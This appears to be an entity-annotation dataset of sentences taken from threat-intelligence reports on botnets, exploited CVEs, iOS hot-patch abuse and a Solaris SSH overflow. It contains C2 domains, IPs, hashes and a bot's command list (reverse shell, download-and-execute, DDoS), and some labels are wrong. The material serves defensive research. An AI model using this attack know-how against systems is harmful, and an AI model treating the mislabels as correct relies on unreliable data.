"Operating_System"]]}], ["Figure 2:", {"entities": []}], ["Figure 3 shows the JavaScript downloaded from hxxp://cnbang.net/bugfix.JS that is used to patch the faulty code.", {"entities": []}], ["Figure 3.", {"entities": []}], ["Figure 3:", {"entities": []}], ["Figure 3: Timeline of activity for CVE-2018-15982 CVE-2018-15982:", {"entities": [[35, 49, "Vulnerability"], [50, 64, "Vulnerability"]]}], ["Figure 4 Worldwide Crimeware Activity Figure 5", {"entities": []}], ["Figure 4:", {"entities": []}], ["Figure 5 highlights the regular monthly pattern of overall malicious emails.", {"entities": []}], ["Figure 5: Timeline of Activity for CVE-2018-4878 CVE-2018-4878:", {"entities": [[35, 48, "Vulnerability"], [49, 62, "Vulnerability"]]}], ["Figure 7 FireEye Detection vs. Anti-Virus Detection By the end of May, we observed a big spike on the unique binaries associated with this malicious activity.", {"entities": [[9, 16, "ORG"], [55, 69, "DATE"]]}], ["Figure 8 Asprox Campaign Unique Sample Tracking Figure 9 Geographical Distribution of the Campaign Figure 10 Distribution of Industries Affected Brief Technical Analysis Figure 11 Attack Architecture Infiltration", {"entities": []}], ["Figure 9.", {"entities": []}], ["Finally, it runs the file using the WinExec function.", {"entities": []}], ["FireEye", {"entities": [[0, 7, "ORG"]]}], ["FireEye Mandiant has been investigating compromised Oracle Solaris machines in customer environments.", {"entities": [[52, 66, "Operating_System"]]}], ["FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.", {"entities": [[0, 7, "ORG"], [54, 58, "DATE"], [63, 67, "DATE"]]}], ["First Communication Packet Bot ID RC4 Encrypted URL POST /5DBA62A2529A51B506D197253469FA745E7634B4FC", {"entities": []}], ["First, it removed the SMB scanner which was observed in the May 2021 attack.", {"entities": [[60, 68, "DATE"]]}], ["Five years ago we published the report “Cybercrime Exposed,” which detailed the rise of cybercrime as a service.", {"entities": [[0, 14, "DATE"]]}], ["For Solaris 9, as well as Solaris 10 or 11 systems where patching is inconvenient, we recommend editing the /etc", {"entities": [[4, 11, "Operating_System"], [12, 13, "Version_Tag"], [26, 33, "Operating_System"], [34, 36, "Version_Tag"], [40, 42, "Version_Tag"]]}], ["For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets with hard-coded base addresses for English (“en”) and Chinese (“zh-cn” and “zh-tw”).", {"entities": [[150, 157, "LANGUAGE"], [169, 176, "LANGUAGE"]]}], ["For example, in December 2017, a tool was released to hide PowerShell in a graphic file.", {"entities": [[16, 29, "DATE"]]}], ["For instance, the sample used in the March attack used a different seed, 0x7774DEAD.", {"entities": [[37, 42, "DATE"]]}], ["For these non-zero-day vulnerabilities, there was a very small window (often only hours or a few days) between when the patch was released and the first observed instance of attacker exploitation.", {"entities": [[14, 22, "Vulnerability"]]}], ["For vulnerabilities that have already been exploited, the subsequent introduction of publicly available exploit or POC code indicates malicious actor interest and makes exploitation accessible to a wider range of attackers.", {"entities": []}], ["FortiGuard Labs Threat Research Report Affected Platforms: Linux Impacted Users: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity Level:", {"entities": []}], ["FortiGuard Labs will continue monitoring this campaign and provide updates as necessary.", {"entities": [[0, 15, "ORG"]]}], ["Found mostly on home computers back then, its primary task was to steal login credentials for online banking services.", {"entities": []}], ["Frequently, first exploitation dates are not publicly disclosed.", {"entities": []}], ["From announcement to inclusion, test and use in production within 7 days is impressive.", {"entities": [[66, 72, "DATE"]]}], ["From this list of generated domains, it connects to them one by one to see which one is online.", {"entities": []}], ["HHV3: 61456 HHV4: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; InfoPath.2; .NET", {"entities": []}], ["HTTP request made to attack Visual Tools DVR Aside from the bot, the payload will install a XMRig Monero miner with the following wallet.", {"entities": []}], ["HTTP.Management.", {"entities": []}], ["HTTP:CGI:BASH-CODE-INJECTION HTTP:", {"entities": []}], ["Home.", {"entities": []}], ["Host:", {"entities": []}], ["How to guard against the Trickbot Trojan", {"entities": []}], ["However, if the original app is embedded with the JSPatch engine, its behavior can be changed according to the JavaScript code loaded at runtime.", {"entities": []}], ["However, it is worth pointing out that the operating system does not differentiate Apple apps’ private framework usage and a third party app’s private framework usage.", {"entities": [[83, 88, "ORG"]]}], ["However, the JavaScript code shown in Figure 9 invalidates that assumption.", {"entities": []}], ["However, the speed they include new innovative techniques to bypass end-point security and or evade sandboxing appears to be at an ever-increasing pace.", {"entities": []}], ["However, we believe that POC code likely hastens exploitation attempts for vulnerabilities that do not require user interaction.", {"entities": []}], ["IRCBot) that is actively exploiting some services, including a new exploit added to its arsenal.", {"entities": []}], ["If the parse_user_name function were reachable in another context, then the vulnerability could become exploitable.", {"entities": []}], ["If you are using an out-of-date Microsoft Office 2007 or 2010, update Microsoft Office to the latest version.", {"entities": [[32, 48, "Software_Name"], [49, 53, "DATE"], [57, 61, "DATE"], [70, 86, "Software_Name"]]}], ["If you have Java 1.6, update Java to the latest 1.7 version.", {"entities": [[12, 16, "Software_Name"], [29, 33, "Software_Name"]]}], ["Illumos (OpenIndiana 2020.04) Mitigations and Workaround A patch from Oracle for Solaris 10 and 11 is described in the October 2020 Critical Patch Update .", {"entities": [[70, 76, "ORG"], [81, 88, "Operating_System"], [89, 91, "Version_Tag"], [119, 131, "DATE"]]}], ["In 59% of cases, a patch was released on the same day the vulnerability was disclosed.", {"entities": [[41, 53, "DATE"]]}], ["In Q3 the growth of coin miner malware returned to unprecedented levels after a temporary slowdown in Q2.", {"entities": []}], ["In Q3 we saw two new exploit kits: Fallout and Underminer.", {"entities": []}], ["In addition to the MSVCR71.dll ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6.", {"entities": [[31, 35, "Process"], [114, 118, "Software_Name"]]}], ["In addition to using the same password “java7,” this variant was configured with the mutex with the similar pattern of “YFds*&^ff” and connected to a CnC server at windows.ddns[.]us.", {"entities": []}], ["In addition, it prevents other botnets from taking over the device by blocking connections to commonly targeted ports.", {"entities": []}], ["In addition, it’s a good idea to use cyberthreat monitoring services to detect suspicious activity in the company’s infrastructure.", {"entities": []}], ["In comparison to the campaign at the end of 2013, the current campaign uses one of the newer versions of the Asprox family where threat actors added the command “ear.”", {"entities": [[33, 48, "DATE"]]}], ["In comparison, Figure 6 is a compilation of all the hits from our analytics.", {"entities": []}], ["In contrast to adversaries who can release mistakes in code and implementation, we simply cannot.", {"entities": []}], ["In effect, it can generate up to 253 unique domains.", {"entities": []}], ["In fact, if a /core file exists on a Solaris machine and the file command reports that it is from sshd , those are indicators consistent with this vulnerability having been exploited.", {"entities": [[37, 44, "Operating_System"]]}], ["In fact, its presence there could indicate something far more serious — a ransomware injection attempt or even part of a targeted cyberespionage operation.", {"entities": []}], ["In fact, right before this blog was published, our monitoring system encountered yet another updated variant that we are currently investigating.", {"entities": []}], ["In late 2013, malware labeled as Kuluoz, the specific spam component of the Asprox botnet, was discovered to be the main payload of what would become the first malicious email campaign.", {"entities": [[3, 12, "DATE"], [33, 39, "Malware_Name"]]}], ["In many cases, this functions fine; however, when the row index exceeds the range of the data source array, which can easily happen, the program will throw an exception and subsequently cause the app to crash.", {"entities": []}], ["In particular, the continued rise in cryptojacking, which has made an unexpected emergence over the course of a year.", {"entities": [[110, 116, "DATE"]]}], ["In recent months however, the court notice and court request-themed emails appear to be the most successful phishing scheme theme for the campaign.", {"entities": [[3, 16, "DATE"]]}], ["In recent months we have gathered more threat intelligence, correlating and analyzing data to provide more useful insights into what is happening in the evolving threat landscape.", {"entities": [[3, 16, "DATE"]]}], ["In recent years, however, its creators have actively transformed the banking Trojan into a multifunctional modular tool.", {"entities": [[3, 15, "DATE"]]}], ["In summary, a vulnerable host parameter allows authenticated users to execute arbitrary commands in the target device.", {"entities": []}], ["In the author’s own words ( bold added for emphasis): JSPatch bridges Objective-C and JavaScript using the Objective-C runtime.", {"entities": []}], ["In the last week of September 2021, Juniper Threat Labs detected a new activity from Necro Python (a.k.a N3Cr0m0rPh , Freakout, Python.", {"entities": [[3, 34, "DATE"], [36, 55, "ORG"]]}], ["In the right hands, it can be used to quickly and effectively deploy patches and code updates.", {"entities": []}], ["In this blog post we present a description of the vulnerability, offer a quick way to test whether a system may be vulnerable, and suggest mitigations and workarounds.", {"entities": []}], ["In this case, it is being exploited to force vulnerable devices to download and execute a malicious script, tshit.sh , which then downloads the main binary payloads, as discussed in the next section.", {"entities": []}], ["In this case, the only additional work to enable it is to add seven lines of code to the application:didFiishLaunchingWithOptions: selector.", {"entities": []}], ["In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.", {"entities": [[63, 67, "Software_Name"]]}], ["In this edition, we highlight the notable investigative research and trends in threats statistics and observations gathered by the McAfee Advanced Threat Research and McAfee Labs teams in Q3 of 2018.", {"entities": [[127, 162, "ORG"], [167, 178, "ORG"], [194, 198, "DATE"]]}], ["In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations.", {"entities": [[31, 38, "ORG"]]}], ["In this previous incident, visitors to the Center for Defense Information website (www.cdi[.]org — also an organization involved in defense matters — were redirected to an exploit server at 159.54.62.92.", {"entities": []}], ["In this series of articles, FireEye mobile security researchers examine the security risks of iOS apps that employ these alternate solutions for hot patching, and seek to prevent unintended security compromises in the iOS app ecosystem.", {"entities": [[28, 35, "ORG"], [94, 97, "Operating_System"], [218, 221, "Operating_System"]]}], ["In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.", {"entities": [[200, 204, "DATE"]]}], ["Indeed, adversary adoption is often faster than the InfoSec industry can implement and test effective countermeasures.", {"entities": []}], ["Injection The FortiGuard Web Filtering Service blocks downloaded URLs and identified C2s.", {"entities": []}], ["Introduction Apple has made a significant effort to build and maintain a healthy and clean app ecosystem.", {"entities": [[13, 18, "ORG"]]}], ["It appears that the threat actors behind this campaign are fairly responsive to published blogs and reports surrounding their malware techniques, tweaking their malware accordingly to continuously try and evade detection with success.", {"entities": []}], ["It is also likely that in some cases exploitation occurred without being discovered before researchers recorded exploitation attached to a certain date.", {"entities": []}], ["It is also referred to as Dark due to the filenames used for its binaries (e.g., Dark.arm, dark.mips, etc.).", {"entities": [[26, 30, "Campaign"]]}], ["It is delivered to the app through network communication.", {"entities": []}], ["It is simply the App Store policy that bans third party use.", {"entities": []}], ["It leverages a recently post-authenticated RCE vulnerability released barely two weeks prior.", {"entities": []}], ["It selects from a list of dynamic DNS services as its domain, e.g., ddns.net and prefixes that with 10-19 random characters.", {"entities": []}], ["It targets a recently published TP-Link wireless router RCE vulnerability.", {"entities": []}], ["It uses the DGA domain to host campaign.js Necro injects javascript code to html, htm, php and .js", {"entities": [[43, 48, "Malware_Name"]]}], ["It uses the DGA domain to host campaign.js We also noted a change in its TOR Socks proxies.", {"entities": [[77, 82, "Protocol"]]}], ["It was designed to support custom forms of authentication such as two-factor without modifying the SSH protocol.", {"entities": []}], ["Its operators can then use it for various tasks — from reselling access to the corporate infrastructure to third-party attackers, to stealing sensitive data.", {"entities": []}], ["JSPatch JSPatch is an open source project – built on top of Apple’s JavaScriptCore framework – with the goal of providing an alternative to Apple’s arduous and unpredictable review process in situations where the timely delivery of hot fixes for severe bugs is vital.", {"entities": [[60, 65, "ORG"], [140, 145, "ORG"]]}], ["JSPatch Machinery", {"entities": []}], ["JSPatch hot patch fixing index out of bound bug in Figure 1 Malicious Capability Showcase JSPatch is a boon to iOS developers.", {"entities": [[111, 114, "Operating_System"]]}], ["JSPatch setup in the targeted app There is a sequence of flow from the app entry point (in this case the AppDelegate class) to where the JavaScript file containing updates or patch code is written to the file system.", {"entities": []}], ["Java 1.6 is no longer supported and does not receive security updates.", {"entities": [[0, 4, "Software_Name"]]}], ["JavaScript patch code that loads the Accounts.framework into the app process If this JavaScript code were delivered to the target app as a hot patch, it could dynamically load a public framework, Accounts.framework , into the running process.", {"entities": []}], ["Kamilló Matek discusses the full details of this vulnerability in this article .", {"entities": [[0, 13, "PERSON"]]}], ["LOCALAPPDATA%/[8 CHARACTERS].EXE Example filename: %", {"entities": []}], ["LOCALAPPDATA%\\\\lwftkkea.exe", {"entities": []}], ["Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign — this one exploiting a zero-day vulnerability in Flash.", {"entities": [[34, 51, "Campaign"], [58, 65, "ORG"], [198, 203, "Software_Name"]]}], ["Location of downloaded JavaScript on test device Figure 6.", {"entities": []}], ["MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDCUAUdLJ1rmxx+bAndp+Cz6+5I' Kmgap2hn2df/UiVglAvvg2US9qbk65ixqw3dGN/9O9B30q5RD+xtZ6gl4ChBquqw jwxzGTVqJeexn5RHjtFR9lmJMYIwzoc/kMG8e6C/GaS2FCgY8oBpcESVyT2woV7U 00SNFZ88nyVv33z9+wIDAQAB -----END", {"entities": []}], ["Mandiant Intelligence confirmed that North Korea’s APT37 exploited this vulnerability as a zero-day as early as September 3, 2017.", {"entities": [[0, 21, "ORG"], [37, 50, "GPE"], [91, 99, "Vulnerability"]]}], ["Mandiant Threat Intelligence research into vulnerabilities exploited in 2018 and 2019 suggests that the majority of exploitation in the wild occurs before patch issuance or within a few days of a patch becoming available.", {"entities": [[0, 28, "ORG"], [72, 76, "DATE"], [81, 85, "DATE"], [180, 190, "DATE"]]}], ["Mandiant experts from the FLARE team will provide more information on this vulnerability and how it was used by UNC1945 during a Nov. 12 webinar.", {"entities": [[0, 8, "ORG"], [129, 136, "DATE"]]}], ["McAfee Detects and Protects Since the initial release of this technique in December 2017, McAfee Labs has been investigating this technique and how we might protect our customers.", {"entities": [[0, 6, "ORG"], [75, 88, "DATE"]]}], ["McAfee is collaborating closely with MITRE Corporation in extending the techniques of its MITRE ATT&CK™ knowledge base, and we now include the model in our report.", {"entities": [[0, 6, "ORG"], [37, 54, "ORG"], [90, 95, "ORG"]]}], ["McAfee testing indicates that all versions of product under every Windows version listed above are protected.", {"entities": [[0, 6, "ORG"]]}], ["McAfee’s Product Security Incident Team (PSIRT), working in coordination with McAfee’s product teams 1 delivered a protection to Process Doppelgänging in two of McAfee’s product suites (see below for more detail).", {"entities": [[78, 84, "ORG"], [161, 167, "ORG"]]}], ["McAfee’s protection has tested effective against EnSilo’s original proof of concept (PoC) and other examples.", {"entities": []}], ["McAfee’s testing confirms Ensilo’s results.", {"entities": [[26, 32, "ORG"]]}], ["Mitigation To bypass Windows’ Address Space Layout Randomization (ASLR) protections, this exploit targets computers with any of the following configurations: Windows XP Windows 7 and Java 1.6 Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010 Users can mitigate the threat by upgrading from Windows XP and updating Java and Office.", {"entities": [[183, 187, "Software_Name"], [188, 191, "Version_Tag"], [192, 201, "Operating_System"], [232, 248, "Software_Name"], [249, 253, "DATE"], [257, 261, "DATE"]]}], ["More details about this bypass are addressed by Microsoft’s Security Bulletin MS13-106 and an accompanying blog entry .", {"entities": [[48, 57, "ORG"]]}], ["More than a quarter were exploited within one month after the patch date.", {"entities": [[0, 19, "DATE"], [42, 51, "DATE"]]}], ["Necro Python’s Domain Generation Algorithm Bot Commands Necro connects to the CnC server,  gtmpbeaxruxy.myftp.org, via IRC to receive commands which include the following: Command Function addport add port to the scanner delport remove port from scanner ports send to server the ports currently scanned injectcount send to server the number of files injected reinject launch function to inject to html, php, js, htm files scanner stop or launch scanner sniffer stop or launch sniffer scannetrange scan a range of IPs clearscan empty scanner DB revshell launch a reverse shell shell launch a process using subprocess.", {"entities": [[56, 61, "Malware_Name"]]}], ["Necro Python’s polymorphism, before and after Domain Generation Algorithm Necro uses DGA for both its CnC and download server.", {"entities": []}], ["Necro injects javascript code to html, htm, php and .js", {"entities": [[0, 5, "Malware_Name"]]}], ["Necro was first discovered in January .", {"entities": [[0, 5, "Malware_Name"], [30, 37, "DATE"]]}], ["New Tor Proxies [‘107.150.8.170:9051’, ‘95.217.251.233:1080’, ‘5.130.184.36:9999’, ‘83.234.161.187:9999’, ‘185.186.240.37:9119’, ‘5.61.53.57:9500’, ‘23.237.60.122:9051’, ‘185.82.217.167:9051’, ‘78.153.5.183:666’, ‘51.210.202.187:8425’, ‘85.159.44.163:9050’, ‘217.12.221.85:9051’, ‘130.61.153.38:9050’, ‘142.93.143.155:9010’, ‘8.209.253.198:9000’, ‘127.0.0.1:9050’]", {"entities": []}], ["New malware samples jumped up again in Q3 after a decline during the last two quarters.", {"entities": [[65, 86, "DATE"]]}], ["News outlets recently reported that Trickbot’s authors have hooked up with various new partners to use the malware to infect corporate infrastructure with all kinds of additional threats, such as the Conti ransomware.", {"entities": []}], ["Notice that Asprox uses a hardcoded mutex that can be found in its strings.", {"entities": []}], ["Objc code enabling JSPatch in an app JSPatch is indeed lightweight.", {"entities": []}], ["On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has Microsoft Office 2007 or 2010.", {"entities": [[3, 12, "Operating_System"], [108, 112, "Software_Name"], [113, 116, "Version_Tag"], [202, 218, "Software_Name"], [219, 223, "DATE"], [227, 231, "DATE"]]}], ["On our test device, we eventually found that the JavaScript patch code is hashed and stored at the location shown in Figure 5.", {"entities": []}], ["Once ROP marks the shellcode as executable using Windows’ VirtualProtect function, it downloads an executable via the InternetOpenURLA and InternetReadFile functions.", {"entities": []}], ["Once loaded into memory, the injected code is then unpacked as a DLL.", {"entities": []}], ["Once the framework is loaded, the script has full access to all of the framework’s APIs.", {"entities": []}], ["Once the victim executes the malicious payload, it begins to start an svchost.exe process and then injects its code into the newly created process.", {"entities": []}], ["One Month 15 percent of vulnerabilities were exploited after one week but within one month of patch release.", {"entities": [[61, 69, "DATE"], [81, 90, "DATE"]]}], ["One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk.", {"entities": []}], ["One situation where network-facing software does not always limit the username length arises in the SSH server, and this is the exploit vector used by the tool that we discovered.", {"entities": [[100, 103, "Protocol"]]}], ["Openserver v5 and v6 CVE-2020-28188 – TerraMaster TOS <=", {"entities": [[21, 35, "Vulnerability"]]}], ["Our analysis of recent threats included one notable introduction in a disturbing category.", {"entities": []}], ["Our experts were able to download modules of the Trojan from one of its C&C servers and analyze them thoroughly.", {"entities": []}], ["Overall Asprox Botnet tracking Figure 6 Asprox Botnet Activity Unique Samples", {"entities": []}], ["PAM enables a Solaris application to authenticate users while allowing the system administrator to configure authentication parameters (e.g., password complexity and expiration) in one location that is consistently enforced by all applications.", {"entities": [[14, 21, "Operating_System"]]}], ["POST /D28419029043311C6F8BF9F5", {"entities": []}], ["PUBLIC KEY-----", {"entities": []}], ["Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4, 2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014.", {"entities": [[157, 170, "DATE"]]}], ["PlugX/Kaba payload analysis Once the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint.", {"entities": []}], ["Poison Ivy Poison Ivy 2012-06-11 2012-06-11", {"entities": [[0, 10, "Malware_Name"], [11, 21, "Malware_Name"], [22, 32, "DATE"], [33, 43, "DATE"]]}], ["Popen() killknight kill itself execute executes a file killbyname kill process by name killbypid kill process by pid disable disable exploitation module enable enable exploitation module getip get current IP ram get information about the memory update update this bot visit visit a URL dlexe download and execute a file info get system information repack morph this bot logout logout from the server reconnect reconnect to the server udpflood UDP flood synflood SYN flood tcpflood TCP flood slowloris slowloris DDoS attack httpflood launch httpflood torflood launch DDoS using TOR SOCKS proxies loadamp initialize amplification attack reflect launch DNS reflection attack We have noted a few changes on this bot from the previous version.", {"entities": []}], ["Previously, Asprox malicious email campaigns targeted various industries in multiple countries and included a URL link in the body.", {"entities": []}], ["Previously, it used a hardcoded url, ‘ ublock-referer[.]dev/campaign.js ’ and injects this on the scripts and now it uses the DGA for its url, i.e., ‘DGA_DOMAIN/campaign.js’ .", {"entities": []}], ["Private APIs used by public framework:", {"entities": []}], ["Proof of Concept Exploit In order to quickly test different versions of Solaris to see if they may be vulnerable, we developed a proof of concept exploit to trigger the overflow and crash the SSH server.", {"entities": [[192, 195, "Protocol"]]}], ["Register today and start preparing questions, because we will be fielding them from the audience at the end of the session.", {"entities": [[9, 14, "DATE"]]}], ["Release is targeted around June 1, 2018 WSS 16.0.12 will include the same protection.", {"entities": []}], ["Release of WSS is targeted for the end of May, or the beginning of June, 2018.", {"entities": [[31, 45, "DATE"], [50, 77, "DATE"]]}], ["Router.", {"entities": []}], ["SSH Keyboard-Interactive authentication is a “passthrough” authentication mechanism where the SSH protocol relays prompts and responses between the server’s PAM libraries and the client.", {"entities": [[0, 3, "Protocol"], [94, 97, "Protocol"]]}], ["Same Package As with Mirai’s normal infection routine, the executed shell script downloads the main payload binaries for different architectures and platforms and executes them blindly in the victim’s system.", {"entities": []}], ["Second, it changed the url that it injects to script files on the compromised system.", {"entities": []}], ["Similar to the previous example, a malicious JSPatch JavaScript could instruct an app to load an arbitrary private framework, such as the BluetoothManager.framework , and further invoke private APIs to change the state of the device.", {"entities": []}], ["Since then, the threat actors have continuously tweaked the malware by changing its hardcoded strings, remote access commands, and encryption keys.", {"entities": []}], ["So What is the Process Doppelgänging Technique in a Nutshell?", {"entities": []}], ["Solution Fortinet customers are protected by the following: The following generic FortiGuard IPS signatures were able to detect this attack before this vulnerability was disclosed: TP-Link.", {"entities": [[82, 92, "ORG"]]}], ["Some security solutions still recognize Trickbot as a banking Trojan, as per its original specialty.", {"entities": []}], ["Specifically, if an attacker is able to tamper with the content of JavaScript file that is eventually loaded by the app, a range of attacks can be successfully performed against an App Store application.", {"entities": []}], ["Subscribe to Blogs Get email updates as new blog posts are added.", {"entities": []}], ["Successful exploitation will download the bot into the system and install a Monero miner.", {"entities": []}], ["Successful operations by these types of groups are likely to have a high potential impact.", {"entities": []}], ["Such repurposing could pose an additional danger to employees of corporate security operation centers and other cybersec experts.", {"entities": []}], ["TARGET_PORTS", {"entities": []}], ["TP-Link has already released an updated firmware for this affected hardware version  and users are strongly encouraged to update their devices.", {"entities": []}], ["Table 1 provides some insight into the race between attackers attempting to exploit vulnerable software and organizations attempting to deploy the patch.", {"entities": []}], ["Table 1:", {"entities": []}], ["Target App", {"entities": []}], ["That adversaries adopt new techniques is a known fact.", {"entities": []}], ["That is a 16,000% increase in unique MD5s over the usual malicious email campaign we’d observed.", {"entities": []}], ["That makes the APP obtaining the power of script language: add modules or replacing Objective-C code to fix bugs dynamically .", {"entities": []}], ["That’s why FireEye strongly recommends upgrading to Java 1.7.", {"entities": [[11, 18, "ORG"], [52, 56, "Software_Name"], [57, 60, "Version_Tag"]]}], ["The App Store has a strict policy prohibiting third party apps from using any private frameworks.", {"entities": []}], ["The FLARE team’s Offensive Task Force analyzed the exploit to determine how it worked, reproduced the vulnerability on different versions of Solaris, and then reported it to Oracle.", {"entities": [[141, 148, "Operating_System"], [174, 180, "ORG"]]}], ["The JSPatch author, using the alias Bang, provided a common example of how JSPatch can be used to update a faulty iOS app on his blog: Figure 1 shows an Objc implementation of a UITableViewController with class name JPTableViewController that provides data population via the selector tableView:didSelectRowAtIndexPath: .", {"entities": [[36, 40, "PERSON"], [114, 117, "Operating_System"]]}], ["The JSPatch technology potentially allows an individual to effectively circumvent the protection imposed by the App Store review process and perform arbitrary and powerful actions on the device without consent from the users.", {"entities": []}], ["The McAfee Advanced Threat Research team today published the McAfee® Labs Threats Report, December 2018.", {"entities": [[41, 46, "DATE"], [90, 103, "DATE"]]}], ["The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013.", {"entities": [[4, 20, "Software_Name"], [30, 34, "Process"]]}], ["The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be).", {"entities": [[4, 14, "Malware_Name"], [145, 183, "ORG"]]}], ["The SSH server crashes in the parse_user_name function Vulnerable Operating Systems Solaris 9 (some releases)", {"entities": [[4, 7, "Protocol"]]}], ["The above demonstration highlights a serious security risk for iOS app users and app developers.", {"entities": [[63, 66, "Operating_System"]]}], ["The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically.", {"entities": []}], ["The actual vulnerability is a classic stack-based buffer overflow located in the PAM parse_user_name function .", {"entities": []}], ["The average time between disclosure and patch availability was approximately 9 days.", {"entities": [[63, 83, "DATE"]]}], ["The campaign first appeared in late December of 2013 and has since been seen in fairly cyclical patterns each month.", {"entities": [[31, 52, "DATE"]]}], ["The campaign originally piqued our interest due to the continuous updating of its list of target vulnerabilities—more so than other campaigns we have seen so far.", {"entities": []}], ["The communication uses an RSA (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base Cryptographic Provider while the payloads themselves are RC4 encrypted.", {"entities": []}], ["The corresponding content is shown in Figure 6 in Base64-encoded format: Figure 5.", {"entities": []}], ["The current version of Asprox includes a simple zipped email attachment that contains the malicious payload “exe.”", {"entities": []}], ["The developer community has been searching for alternatives, and with some success.", {"entities": []}], ["The domain ids.ns01[.]us also overlaps with the domain wmi.ns01[.]us on the IP 194.183.224.75.", {"entities": []}], ["The domains are pseudo-randomly generated using a hardcoded seed, 0xFAFFDED00001, and a counter is added until 0xFD (253 in decimal) before the counter is reset to 0.", {"entities": []}], ["The dynamic nature of the code makes it extremely difficult to catch a malicious actor in action.", {"entities": []}], ["The essential contributing component to this status quo is the App Store, which is protected by a thorough vetting process that scrutinizes all submitted applications.", {"entities": []}], ["The exploit targets Visual Tools DVR VX16 4.2.28.0.", {"entities": []}], ["The following examples demonstrate the speed with which sophisticated groups are able to incorporate vulnerabilities into their toolsets following public disclosure and the fact that multiple disparate groups have repeatedly leveraged the same vulnerabilities in independent campaigns.", {"entities": []}], ["The following list contains examples of email subject variations, specifically for the court notice theme: Urgent court notice Notice to Appear in Court Notice of appearance in court Warrant to appear Pretrial notice Court hearing notice Hearing of your case Mandatory court appearance The campaign appeared to increase in volume during the month of May. Figure 4 shows the increase in activity of Asprox compared to other crimewares towards the end of May specifically.", {"entities": [[442, 456, "DATE"]]}], ["The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits) and a determination to infect visitors to foreign and public policy websites.", {"entities": []}], ["The indication that the server is vulnerable is that the SSH client prints “Authentication failed;” a non-vulnerable PAM library causes the SSH server to repeatedly prompt for a username if it receives one that is too long.", {"entities": []}], ["The infiltration phase consists of the victim receiving a phishing email with a zipped attachment containing the malware payload disguised as an Office document.", {"entities": []}], ["The latest addition to its constantly growing list of targeted vulnerabilities is TP-Link Home Wireless Routers, particularly the TL-WR840N EU (V5) model.", {"entities": []}], ["The majority of these vulnerabilities, however, were patched quickly after disclosure.", {"entities": []}], ["The majority of vulnerabilities were exploited as zero-days – before a patch was available.", {"entities": [[50, 59, "Vulnerability"]]}], ["The malware then waits for a command from its Command-and-Control (C2) server to perform different variations of a Denial-Of-Service (DOS) attack.", {"entities": []}], ["The malware uses various encryption techniques to communicate with the command and control (C2) nodes.", {"entities": []}], ["The operating system writes a crash dump to /core if the SSH server crashes with no debugger attached.", {"entities": []}], ["The overflow in the PAM library also causes the SSH server to crash, as shown in Figure 3.", {"entities": []}], ["The parse_user_name function has a stack-based buffer overflow vulnerability The vulnerability arises whenever a username longer than PAM_MAX_RESP_SIZE (512 bytes) is passed to parse_user_name .", {"entities": []}], ["The same process then must be followed when publishing a new release or issuing a patched version of an existing app, which can be extremely frustrating when a developer wants to patch a severe bug or security vulnerability impacting existing app users.", {"entities": []}], ["The scanner function of the bot scans for the following ports and if available, it launches its attack.", {"entities": []}], ["The screenshot of the console log for utilizing Accounts.framework", {"entities": []}], ["The script can run in both Windows and Linux environments.", {"entities": []}], ["The script has its own polymorphic engine to morph itself every execution which can bypass signature-based defenses.", {"entities": []}], ["The security vulnerability occurs in the Pluggable Authentication Modules (PAM) library.", {"entities": []}], ["The seed controls the domain to be generated.", {"entities": []}], ["The standard OpenSSH client offers all the options needed to trigger the vulnerability (Figure 2).", {"entities": []}], ["The statistics show that the majority of Trickbot detections this year were registered in the US, Australia, China, Mexico and France.", {"entities": [[61, 70, "DATE"], [94, 96, "GPE"], [98, 107, "GPE"], [109, 114, "GPE"], [116, 122, "GPE"], [127, 133, "GPE"]]}], ["The target app discussed above, when running, loads the frameworks shown in Figure 8 into its process memory: Figure 8.", {"entities": []}], ["The threat actor made a move in March and in May, adding new exploits to its arsenal.", {"entities": [[32, 37, "DATE"], [45, 48, "DATE"]]}], ["The threat actors likely sought to infect users to these sites for follow-on data theft, including information related to defense and public policy matters.", {"entities": []}], ["The vulnerability has likely existed for decades, and one possible reason is that it is only exploitable if an application does not already limit usernames to a smaller length before passing them to PAM.", {"entities": [[41, 48, "DATE"]]}], ["The vulnerability it targets, assigned CVE-2021-41653 , was only just discovered on November 12 of this year.", {"entities": []}], ["The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution.", {"entities": [[76, 81, "Software_Name"]]}], ["Then it writes the file to disk with CreateFileA and WriteFile functions.", {"entities": []}], ["There are no legitimate uses for the Transactional API to be used in this way, so far as McAfee know.", {"entities": [[89, 95, "ORG"]]}], ["There were a number of cases in which certain vulnerabilities were exploited on a large scale within 48 hours of PoC or exploit code availability (Table 2).", {"entities": [[101, 109, "TIME"]]}], ["Therefore, any “dangerous” or “risky” operations that rely on the APIs provided by this framework are not expected to take place.", {"entities": []}], ["Therefore, infosec officers who 